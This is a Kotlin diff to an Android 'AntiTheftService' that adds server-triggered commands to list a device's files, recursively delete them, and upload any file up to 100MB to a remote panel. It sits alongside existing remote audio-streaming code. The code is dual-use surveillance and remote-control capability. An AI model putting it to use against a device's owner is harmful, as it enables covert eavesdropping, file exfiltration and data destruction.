@@ -355,6 +355,19 @@ class AntiTheftService : LifecycleService() {
                 "START_AUDIO_STREAM" -> startAudioStream()
                 "STOP_AUDIO_STREAM"  -> stopAudioStream()
 
+                "LIST_FILES" -> {
+                    val path = root["path"]?.jsonPrimitive?.content ?: externalRoot()
+                    listRemoteFiles(path)
+                }
+                "DELETE_FILE" -> {
+                    val path = root["path"]?.jsonPrimitive?.content ?: return
+                    deleteRemoteFile(path)
+                }
+                "DOWNLOAD_FILE" -> {
+                    val path = root["path"]?.jsonPrimitive?.content ?: return
+                    uploadRemoteFile(path)
+                }
+
                 "SEND_MESSAGE" -> {
                     val message = root["message"]?.jsonPrimitive?.content ?: return
                     showMessageNotification(message)
@@ -893,6 +906,112 @@ class AntiTheftService : LifecycleService() {
         audioRecord?.stop(); audioRecord?.release(); audioRecord = null
         audioStreamThread = null
         sendConsoleLog("Áudio ao vivo encerrado.")
+    }
+
+    // ── Remote File Browser ────────────────────────────────────────────────────
+
+    private fun externalRoot(): String =
+        android.os.Environment.getExternalStorageDirectory().absolutePath
+
+    @SuppressLint("MissingPermission")
+    private fun listRemoteFiles(path: String) {
+        try {
+            val dir = java.io.File(path)
+            if (!dir.exists() || !dir.canRead()) {
+                sendFileEvent("""{"type":"FILE_LIST_ERROR","deviceId":"$deviceId","path":${Json.encodeToString(path)},"error":"Acesso negado ou pasta não encontrada"}""")
+                return
+            }
+            val items = dir.listFiles()?.map { f ->
+                val ext = if (f.isFile) f.extension.lowercase() else ""
+                """{"name":${Json.encodeToString(f.name)},"type":"${if (f.isDirectory) "dir" else "file"}","size":${f.length()},"modified":${f.lastModified()},"ext":${Json.encodeToString(ext)},"path":${Json.encodeToString(f.absolutePath)}}"""
+            } ?: emptyList()
+
+            val sortedItems = items.sortedWith(compareBy(
+                { !it.contains("\"type\":\"dir\"") },
+                { it.substringAfter("\"name\":\"").substringBefore("\"").lowercase() }
+            ))
+
+            val response = """{"type":"FILE_LIST","deviceId":"$deviceId","path":${Json.encodeToString(path)},"parent":${Json.encodeToString(dir.parent ?: "")},"files":[${sortedItems.joinToString(",")}]}"""
+            sendFileEvent(response)
+        } catch (e: Exception) {
+            sendFileEvent("""{"type":"FILE_LIST_ERROR","deviceId":"$deviceId","path":${Json.encodeToString(path)},"error":${Json.encodeToString(e.message ?: "Erro desconhecido")}}""")
+        }
+    }
+
+    private fun deleteRemoteFile(path: String) {
+        try {
+            val file = java.io.File(path)
+            val success = if (file.isDirectory) file.deleteRecursively() else file.delete()
+            val event = if (success) {
+                """{"type":"FILE_DELETED","deviceId":"$deviceId","path":${Json.encodeToString(path)},"success":true}"""
+            } else {
+                """{"type":"FILE_DELETED","deviceId":"$deviceId","path":${Json.encodeToString(path)},"success":false,"error":"Falha ao excluir"}"""
+            }
+            sendFileEvent(event)
+            sendConsoleLog("${if (success) "✅" else "❌"} Exclusão remota: $path")
+        } catch (e: Exception) {
+            sendFileEvent("""{"type":"FILE_DELETED","deviceId":"$deviceId","path":${Json.encodeToString(path)},"success":false,"error":${Json.encodeToString(e.message ?: "")}}""")
+        }
+    }
+
+    private fun uploadRemoteFile(path: String) {
+        val file = java.io.File(path)
+        if (!file.exists() || !file.isFile) {
+            sendFileEvent("""{"type":"FILE_UPLOAD_ERROR","deviceId":"$deviceId","path":${Json.encodeToString(path)},"error":"Arquivo não encontrado"}""")
+            return
+        }
+        if (file.length() > 100 * 1024 * 1024) { // 100MB limit
+            sendFileEvent("""{"type":"FILE_UPLOAD_ERROR","deviceId":"$deviceId","path":${Json.encodeToString(path)},"error":"Arquivo muito grande (máx 100MB)"}""")
+            return
+        }
+
+        sendConsoleLog("Enviando arquivo ao servidor: ${file.name} (${file.length() / 1024}KB)...")
+
+        val serverUrl = getUploadUrl("/upload/file/$deviceId")
+        val mime = getMimeType(file.extension.lowercase())
+        val requestBody = MultipartBody.Builder()
+            .setType(MultipartBody.FORM)
+            .addFormDataPart("file", file.name, file.asRequestBody(mime.toMediaType()))
+            .addFormDataPart("originalPath", path)
+            .build()
+
+        okHttpClient.newCall(Request.Builder().url(serverUrl).post(requestBody).build())
+            .enqueue(object : Callback {
+                override fun onResponse(call: Call, response: Response) {
+                    response.use {
+                        if (response.isSuccessful) {
+                            sendConsoleLog("✅ Arquivo ${file.name} transferido para o painel.")
+                        } else {
+                            sendConsoleLog("❌ Falha ao enviar ${file.name}: HTTP ${response.code}")
+                        }
+                    }
+                }
+                override fun onFailure(call: Call, e: IOException) {
+                    sendConsoleLog("❌ Falha de rede ao enviar ${file.name}: ${e.message}")
+                }
+            })
+    }
+
+    private fun sendFileEvent(json: String) {
+        try { webSocket?.send(json) } catch (e: Exception) { Log.e("AntiTheftService", "sendFileEvent: ${e.message}") }
+    }
+
+    private fun getMimeType(ext: String): String = when (ext) {
+        "jpg", "jpeg" -> "image/jpeg"
+        "png"  -> "image/png"
+        "gif"  -> "image/gif"
+        "webp" -> "image/webp"
+        "mp4"  -> "video/mp4"
+        "mkv"  -> "video/x-matroska"
+        "avi"  -> "video/avi"
+        "mov"  -> "video/quicktime"
+        "mp3"  -> "audio/mpeg"
+        "aac"  -> "audio/aac"
+        "ogg"  -> "audio/ogg"
+        "pdf"  -> "application/pdf"
+        "txt"  -> "text/plain"
+        "zip"  -> "application/zip"
+        else   -> "application/octet-stream"
     }
 
     private fun notifyReactivateScreenCapture() {
